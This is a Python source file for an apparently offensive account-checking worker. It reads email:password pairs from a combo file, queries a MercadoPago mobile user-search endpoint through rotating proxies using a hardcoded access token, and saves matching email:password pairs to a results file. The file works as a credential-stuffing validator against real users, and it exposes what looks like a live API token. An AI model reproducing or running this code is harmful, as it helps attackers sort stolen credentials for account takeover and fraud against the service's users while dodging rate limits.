import requests
import json
import time
import urllib3
from slave.app.workers.worker import Worker


class MPMailCheckWorker(Worker):

    def __init__(self, usr, psw, priority=1):
        Worker.__init__(self, priority)
        self.setName(self.__class__.__name__)

        self.usr = usr
        self.psw = psw

        self.token = 'APP_USR-1311377052931992-020215-47fd58486ec63034a3a'\
            '693391c132b3a-131907648'
        self.url = 'https://mobile.mercadopago.com/mpmobile/users/search'\
            '?email={usr}&access_token={token}'

        self.success = None


    def run(self):

        # if self.is_started():
        #     return

        self.set_started()

        proxies = {}
        proxy_manager = self.queue.get_proxy_manager()
        if proxy_manager:
            proxies = proxy_manager.get_intelligent_random()
        else:
            proxies = {
                'http': None,
                'https': None
            }

        url = self.url.format(usr=self.usr, token=self.token)

        try:
            result = requests.get(
                url, proxies=proxies, timeout=10).json()

            if 'error' in result:
                self.set_log('error', result['message'])
                self.success = False
            else:
                self.set_log('success', json.dumps(result))
                self.success = True

            self.set_finished()
            return

        except (requests.exceptions.ProxyError,
                urllib3.exceptions.MaxRetryError,
                urllib3.exceptions.NewConnectionError,
                OSError):

            if proxy_manager:
                self.queue.proxy_manager.set_failed(proxies)
            return self.run()


class MPMailFileSerializer:

    def __init__(self, path, separator):
        
        self.separator = separator
        self.path = path

        self.serialized_workers = []


    def workers(self):

        if len(self.serialized_workers):
            return self.serialized_workers

        with open(self.path, 'r') as opened_file:
            for line in opened_file.readlines():
                line = line.replace('\n', '')
                
                if len(line) > 0 and self.separator in line:

                    usr, psw = line.split(self.separator)
                    self.serialized_workers.append(MPMailCheckWorker(usr, psw))

        return self.serialized_workers


    def dump(self, path):

        for worker in self.workers():
            if worker.is_finished() and worker.success:
                open(path, 'a').write('{}:{}'.format(worker.usr, worker.psw))
